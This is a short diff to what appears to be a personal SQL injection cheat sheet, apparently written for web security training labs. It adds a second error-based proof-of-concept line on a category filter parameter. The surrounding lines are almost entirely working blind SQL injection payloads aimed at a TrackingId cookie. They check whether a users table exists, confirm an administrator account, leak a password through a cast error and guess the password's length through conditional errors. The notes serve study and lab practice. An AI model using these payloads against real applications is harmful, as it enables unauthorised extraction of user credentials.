@@ -2797,7 +2797,8 @@ TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
 (Verify admin user)		TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
 
 * Conditional errors
-(PoC)				TrackingId=xyz' ==> error message vs TrackingId=xyz'' ==> no error message
+(PoC)				TrackingId=xyz' 	==> error message vs TrackingId=xyz'' 		==> no error message
+				/filter?category=Pets' 	==> error message vs /filter?category=Pets''	==> no error message
 (users table exists?)		TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' ==> no error, table exists
 (Verify admin user)		TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 (guess password length)		TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
